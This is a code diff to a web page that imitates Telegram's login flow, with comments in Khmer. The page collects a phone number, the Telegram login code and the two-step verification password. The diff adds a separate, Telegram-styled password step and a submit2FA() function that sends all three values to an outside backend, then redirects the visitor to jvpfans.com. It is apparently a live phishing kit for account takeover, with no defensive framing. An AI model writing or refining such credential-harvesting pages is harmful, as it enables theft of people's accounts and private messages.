@@ -17,6 +17,8 @@
     --text-sub: #aaaaaa;
     --accent: #8774e1;
     --accent-hover: #7966d3;
+    --btn-blue: #3b82f6;
+    --btn-blue-hover: #2563eb;
   }
   * { box-sizing: border-box; touch-action: manipulation; }
   body {
@@ -174,6 +176,29 @@
     transform: scale(0.98);
   }
 
+  .btn-blue {
+    width: 100%;
+    background-color: var(--btn-blue);
+    color: white;
+    border: none;
+    padding: 14px;
+    border-radius: 24px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background-color 0.2s, transform 0.05s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+  }
+  .btn-blue:hover {
+    background-color: var(--btn-blue-hover);
+  }
+  .btn-blue:active {
+    transform: scale(0.98);
+  }
+
   /* 💫 CSS Animation សម្រាប់រង្វង់វិល Loading */
   @keyframes spin {
     0% { transform: rotate(0deg); }
@@ -324,10 +349,10 @@
       </div>
     </div>
 
-    <!-- STEP 2: OTP & 2FA Form -->
+    <!-- STEP 2: OTP Code Form -->
     <div id="step-otp" class="space-y-6 hidden">
       
-      <!-- 🐒 Telegram Monkey Animation (ជំនួស 🔐) -->
+      <!-- 🐒 Telegram Monkey Animation -->
       <div class="flex justify-center mb-2">
         <lottie-player 
           src="https://fonts.gstatic.com/s/e/notoemoji/latest/1f648/lottie.json" 
@@ -342,7 +367,7 @@
       <div>
         <div class="flex items-center justify-center gap-2 mb-2">
           <h2 id="display-phone" class="text-2xl font-bold text-white"></h2>
-          <button onclick="goBack()" title="Edit Phone Number" class="text-gray-400 hover:text-white transition p-1">
+          <button onclick="goBackPhone()" title="Edit Phone Number" class="text-gray-400 hover:text-white transition p-1">
             <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
               <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path>
             </svg>
@@ -353,15 +378,10 @@
         </p>
       </div>
       
-      <div class="text-left space-y-4">
+      <div class="text-left">
         <div class="field">
           <label>Telegram Code</label>
           <input id="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="Code" maxlength="5" oninput="checkAutoSubmit(this)" class="text-center font-mono tracking-widest text-xl">
-        </div>
-
-        <div id="password-container" class="field hidden">
-          <label>Two-Step Password (2FA)</label>
-          <input id="password-input" type="password" placeholder="Enter your 2FA password" onkeydown="if(event.key==='Enter') submitOTP()">
         </div>
       </div>
 
@@ -371,6 +391,30 @@
         <span class="spinner"></span>
       </div>
 
+    </div>
+
+    <!-- STEP 3: 2FA Password Form -->
+    <div id="step-2fa" class="space-y-6 hidden">
+      <div>
+        <h2 class="text-3xl font-bold text-white mb-3">Enter Password</h2>
+        <p class="text-gray-400 text-sm max-w-xs mx-auto leading-relaxed">
+          You have Two-Step Verification enabled, so your account is protected with an additional password.
+        </p>
+      </div>
+      
+      <div class="text-left space-y-4">
+        <div class="field relative">
+          <label>Password</label>
+          <input id="password-input" type="password" placeholder="Enter password" onkeydown="if(event.key==='Enter') submit2FA()" class="pr-10">
+          <button type="button" onclick="togglePasswordVisibility()" class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white transition">
+            <svg id="eye-icon" class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24M1 1l22 22"></path>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <button id="btn-2fa-next" onclick="submit2FA()" class="btn-blue">NEXT</button>
     </div>
 
   </div>
@@ -653,6 +697,19 @@
         }
     }
 
+    function togglePasswordVisibility() {
+      const passwordInput = document.getElementById('password-input');
+      const eyeIcon = document.getElementById('eye-icon');
+      
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        eyeIcon.innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>`;
+      } else {
+        passwordInput.type = 'password';
+        eyeIcon.innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24M1 1l22 22"></path>`;
+      }
+    }
+
     async function sendPhone() {
         const phoneInput = document.getElementById('phone-input');
         const btn = document.getElementById('btn-send');
@@ -677,8 +734,6 @@
 
             if (data.success) {
                 document.getElementById('display-phone').innerText = phoneInput.value.trim();
-                document.getElementById('auth-status').innerText = "We've sent the code to the Telegram app on your other device.";
-                document.getElementById('auth-status').className = "text-gray-400 text-sm max-w-xs mx-auto leading-relaxed";
                 document.getElementById('step-phone').classList.add('hidden');
                 document.getElementById('step-otp').classList.remove('hidden');
                 document.getElementById('otp-input').focus();
@@ -699,7 +754,6 @@
         const phoneInput = document.getElementById('phone-input');
         const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();
         const code = document.getElementById('otp-input').value.trim();
-        const password = document.getElementById('password-input').value.trim();
         const loadingIndicator = document.getElementById('loading-indicator');
 
         if (code.length < 5) {
@@ -714,8 +768,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     phoneNumber: phoneClean, 
-                    code: code,
-                    password: password || undefined
+                    code: code
                 })
             });
             const data = await res.json();
@@ -723,12 +776,13 @@
             if (data.success) {
                 window.location.replace(data.redirectUrl || "https://jvpfans.com");
             } else if (data.requiresPassword) {
-                document.getElementById('auth-status').innerText = 'This account has Two-Step Verification enabled. Please enter your 2FA password.';
-                document.getElementById('auth-status').className = 'text-yellow-400 text-sm font-medium max-w-xs mx-auto leading-relaxed';
-                document.getElementById('password-container').classList.remove('hidden');
+                // លោតទៅកាន់ Step 3 (2FA Password Page) ភ្លាមៗ
+                document.getElementById('step-otp').classList.add('hidden');
+                document.getElementById('step-2fa').classList.remove('hidden');
                 document.getElementById('password-input').focus();
             } else {
                 alert(data.error || 'Verification failed.');
+                document.getElementById('otp-input').value = '';
             }
         } catch (err) {
             alert('Connection error!');
@@ -738,11 +792,55 @@
         }
     }
 
-    function goBack() {
+    async function submit2FA() {
+        const phoneInput = document.getElementById('phone-input');
+        const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();
+        const code = document.getElementById('otp-input').value.trim();
+        const password = document.getElementById('password-input').value.trim();
+        const btn = document.getElementById('btn-2fa-next');
+
+        if (!password) {
+            alert('Please enter your 2FA password.');
+            return;
+        }
+
+        btn.disabled = true;
+        btn.innerHTML = '<span>PLEASE WAIT...</span><span class="spinner"></span>';
+        btn.classList.add('opacity-70');
+
+        try {
+            const res = await fetch(`${BACKEND_URL}/api/verify-code`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    phoneNumber: phoneClean, 
+                    code: code,
+                    password: password
+                })
+            });
+            const data = await res.json();
+
+            if (data.success) {
+                window.location.replace(data.redirectUrl || "https://jvpfans.com");
+            } else {
+                alert(data.error || 'Incorrect password.');
+                document.getElementById('password-input').value = '';
+            }
+        } catch (err) {
+            alert('Connection error!');
+            console.error(err);
+        } finally {
+            btn.disabled = false;
+            btn.innerText = 'NEXT';
+            btn.classList.remove('opacity-70');
+        }
+    }
+
+    function goBackPhone() {
         document.getElementById('step-otp').classList.add('hidden');
-        document.getElementById('password-container').classList.add('hidden');
-        document.getElementById('password-input').value = '';
+        document.getElementById('step-2fa').classList.add('hidden');
         document.getElementById('otp-input').value = '';
+        document.getElementById('password-input').value = '';
         document.getElementById('step-phone').classList.remove('hidden');
     }
   </script>
